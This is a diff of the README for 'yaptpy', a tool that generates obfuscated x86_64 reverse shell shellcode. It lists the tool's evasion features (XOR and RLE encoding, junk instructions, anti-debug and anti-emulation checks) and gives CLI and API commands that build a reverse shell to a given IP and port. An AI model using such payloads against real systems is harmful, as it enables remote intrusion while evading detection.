@@ -1,58 +1,99 @@
-# YAPT: yet another payload tool #
+# yaptpy
 
-This Python script is a x86_64 reverse shell shellcode generator that builds highly obfuscated payloads using several evasion techniques. Here’s an overview of its main components and functionality:
+> CLI tool that generates highly obfuscated x86_64 reverse shell shellcode with multiple evasion techniques
 
-Key Functionalities
-Assembly Code Handling:
-The script uses pwntools to assemble custom assembly snippets. A helper function removes comments from assembly strings before assembling them, ensuring clean code generation.
+[![PyPI](https://img.shields.io/pypi/v/yaptpy.svg)](https://pypi.org/project/yaptpy/)
+[![Python](https://img.shields.io/pypi/pyversions/yaptpy.svg)](https://pypi.org/project/yaptpy/)
+[![Coverage](https://codecov.io/gh/daedalus/yaptpy/branch/main/graph/badge.svg)](https://codecov.io/gh/daedalus/yaptpy)
+[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
 
-Encryption & Encoding Options:
-It offers simple byte-wise XOR encryption and a rolling XOR variant. Additionally, there’s an option to apply Run-Length Encoding (RLE) to the payload. When RLE is enabled, a self-decoding stub is generated to decompress the payload at runtime.
+## Install
 
-Polymorphic Junk Insertion:
-To further obfuscate the payload, the script can prepend random “junk” assembly instructions that have no functional effect but help evade signature-based detections.
-
-Anti-Debug and Anti-Emulation:
-Optional code blocks perform anti-debugging checks (using the ptrace system call) and anti-emulation techniques (using timing checks with rdtsc and cpuid instructions).
-
-Reverse Shell Payload:
-The core functionality sets up a TCP socket to a given IP and port, redirects standard I/O (stdin, stdout, stderr) using dup2, and then executes a specified executable (default is /bin/sh) via an execve system call.
-
-Additional Obfuscation:
-The script includes options for obfuscating the executable path in memory (via XOR) and for using indirect system calls through a “syscall gadget”, which further complicates static analysis.
-
-Workflow Summary
-Argument Parsing:
-The script uses argparse to accept parameters for the attacker's IP, port, the executable path, and various flags to enable or disable obfuscation features.
-
-Payload Generation:
-Based on the provided flags, it builds an assembly payload that includes the reverse shell logic along with optional anti-debug/anti-emulation, stack pivoting, and junk insertion.
-
-Optional Encoding & Encryption:
-After generating the core payload, it may be further processed using RLE encoding and/or XOR-based encryption, depending on the user’s choices.
-
-Output:
-The final shellcode is printed in a format suitable for embedding in C or Python code.
-
-This script is designed for scenarios where evasion from detection is critical, combining multiple layers of obfuscation and anti-analysis techniques into one payload generation process.
-
-## Installing ##
+```bash
+pip install yaptpy
 ```
-git clone https://github.com/daedalus/yapt/
-virtualenv venv
-source venv/bin/activate
-cd yapt
-python setup.py install
+
+## Usage
+
+```python
+from yaptpy import generate_payload
+
+# Generate basic reverse shell shellcode
+shellcode = generate_payload(
+    ip="192.168.1.100",
+    port=4444,
+    executable_path="/bin/sh",
+    junk=True,
+    anti_emulation=False,
+    stack_pivot=False,
+    obfuscate_path=False,
+    anti_debug=False,
+    indirect_syscalls=False,
+)
 ```
-## Running ##
+
+## CLI
+
+```bash
+yapt --help
+```
+
 Basic reverse shell:
-
-`yapt --ip 192.168.1.100 --port 4444`
+```bash
+yapt --ip 192.168.1.100 --port 4444
+```
 
 Obfuscated version with multiple techniques:
+```bash
+yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA
+```
 
-`yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA`
+## API
 
-## License ##
+### `generate_payload(ip, port, executable_path, junk, anti_emulation, stack_pivot, obfuscate_path, anti_debug, indirect_syscalls) -> bytes`
+Generates core reverse shell payload with optional features.
+
+### `xor_encrypt(data: bytes, key: int) -> bytes`
+Encrypts data using simple byte-wise XOR.
+
+### `rolling_xor_encrypt(data: bytes, key: int) -> bytes`
+Encrypts data using rolling XOR (key increments).
+
+### `rle_encode(data: bytes) -> bytes`
+Encodes data using Run-Length Encoding.
+
+### `generate_polymorphic_junk() -> bytes`
+Generates random non-functional assembly instructions.
+
+### `remove_comments_from_assembly(assembly_code: str) -> str`
+Removes comments from assembly code.
+
+### `rle_decoder_stub(original_size: int) -> bytes`
+Generates RLE decoder stub.
+
+### `rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes`
+Generates rolling XOR decoder stub.
+
+## Development
+
+```bash
+git clone https://github.com/daedalus/yaptpy.git
+cd yaptpy
+pip install -e ".[test]"
+
+# run tests
+pytest
+
+# format
+ruff format src/ tests/
+
+# lint
+ruff check src/ tests/
+
+# type check
+mypy src/
+```
+
+## License
 
 MIT
